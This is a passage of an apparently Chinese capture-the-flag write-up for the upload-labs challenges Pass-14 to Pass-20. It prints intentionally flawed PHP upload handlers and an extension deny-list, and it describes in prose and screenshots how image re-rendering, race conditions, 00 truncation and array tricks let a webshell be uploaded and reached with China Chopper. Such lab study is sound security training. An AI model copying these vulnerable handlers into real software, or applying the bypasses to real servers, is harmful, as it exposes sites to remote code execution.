class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$types</span> = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$info</span> = getimagesize(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable">$ext</span> = image_type_to_extension(<span class="variable">$info</span>[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos(<span class="variable">$types</span>,<span class="variable">$ext</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = isImage(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="pass-15同13相同图片码"><a class="markdownIt-Anchor" href="#pass-15同13相同图片码">#</a> Pass-15 (同 13 相同图片码)</h2><p>题目源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    <span class="variable">$image_type</span> = exif_imagetype(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$image_type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;gif&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;png&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = isImage(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="pass-16图片渲染绕过"><a class="markdownIt-Anchor" href="#pass-16图片渲染绕过">#</a> Pass-16 (图片渲染绕过)</h2><p>题目源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target_path</span>=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.basename(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    <span class="variable">$fileext</span>= substr(strrchr(<span class="variable">$filename</span>,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = imagecreatefromjpeg(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                <span class="variable">$newfilename</span> = strval(rand()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                imagejpeg(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;png&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = imagecreatefrompng(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是png格式的图片！&quot;</span>;</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                <span class="variable">$newfilename</span> = strval(rand()).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                imagepng(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;gif&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = imagecreatefromgif(<span class="variable">$target_path</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是gif格式的图片！&quot;</span>;</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                <span class="variable">$newfilename</span> = strval(rand()).<span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                imagegif(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先上传一个普通的 gif 图，再进行保存下载，分析两张图片，找到位置相同处进行写马 (图片渲染)</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210312094855752.png" alt="image-20210312094855752"></p><p>相同位置进行写马</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210312094927938.png" alt="image-20210312094927938"></p><p>成功上传</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210312095224492.png" alt="image-20210312095224492"></p><p>利用菜刀进行连接，获得权限</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210312095313316.png" alt="image-20210312095313316"></p><h2 id="pass-17pass-18条件竞争"><a class="markdownIt-Anchor" href="#pass-17pass-18条件竞争">#</a> Pass-17,Pass-18（条件竞争）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$file_name</span>,strrpos(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             rename(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            unlink(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="pass-19php00截断jpg上传"><a class="markdownIt-Anchor" href="#pass-19php00截断jpg上传">#</a> Pass-19 (php00 截断，jpg 上传）</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_ext</span> = pathinfo(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array(<span class="variable">$file_ext</span>,<span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123; </span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">分析，move_uploaded_file()函数中的img_path是由post参数save_name控制的，</span><br><span class="line">因此可以在save_name利用00截断绕过：</span><br><span class="line">首先上传一个图片马</span><br></pre></td></tr></table></figure><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210313100100590.png" alt="image-20210313100100590"></p><p>再进行 hex 00 截断</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210313100210338.png" alt="image-20210313100210338"></p><p>进行上传，上传成功</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210313100235376.png" alt="image-20210313100235376"></p><p>菜刀连接，拿到 shell</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210313100516143.png" alt="image-20210313100516143"></p><p>第二种方法，传一个 REQUEST 请求，进行浏览器 GET 得 flag</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210313101545220.png" alt="image-20210313101545220"></p><p>更改 hex 00 截断上传</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210313101617346.png" alt="image-20210313100443380"></p><p>浏览器进行 GET 请求访问</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210313101647574.png" alt="image-20210313101647574"></p><p>查看到 flagvalue.txt</p><p><img data-src="https://gitee.com/chungod/picture/raw/master/image/image-20210313101719963.png" alt="image-20210313101719963"></p><h2 id="pass-20数组绕过"><a class="markdownIt-Anchor" href="#pass-20数组绕过">#</a> Pass-20 (数组绕过)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];  判断save_name是否为空,否则用POST传递</span><br><span class="line">        <span class="keyword">if</span> (!is_array(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = explode(<span class="string">&#x27;.&#x27;</span>, strtolower(<span class="variable">$file</span>));</span><br><span class="line">        &#125;explode - 把字符串打散为数组,以点分隔  strtolower — 将字符串转化为小写</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ext</span> = end(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_name</span> = reset(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[count(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line"> reset() 输出数组中的当前元素和下一个元素的值，然后把数组的内部指针重置到数组中的第一个元素</span><br><span class="line"> count() 函数返回数组中元素的数目。</span><br><span class="line"></span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">   